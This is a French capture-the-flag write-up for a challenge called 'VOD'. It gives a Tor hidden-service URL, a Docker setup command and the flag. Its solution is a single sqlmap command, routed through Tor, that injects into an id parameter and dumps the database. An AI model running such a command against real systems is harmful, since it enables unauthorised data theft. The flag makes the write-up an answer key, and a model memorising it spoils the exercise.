# VOD
## Challenge

Votre équipe a reçu un message (très) sécurisé de la part d'un agent soit-disant s3c3rt vous invitant à vous rendre sur ce site  http://xwjtp3mj427zdp4tljiiivg2l5ijfvmt5lcsfaygtpp6cw254kykvpyd.onion:1337.

Drôle d'url.

## Résolution

```
sqlmap -tor --tor-type=SOCKS5 -u "http://xwjtp3mj427zdp4tljiiivg2l5ijfvmt5lcsfaygtpp6cw254kykvpyd.onion:1337/platform.php?id=1" --batch --dump
```

## Setup

```
docker-compose up --build -d
```

## Flag

```PHACK{D0_U_kn0w_sQLm4p?}

```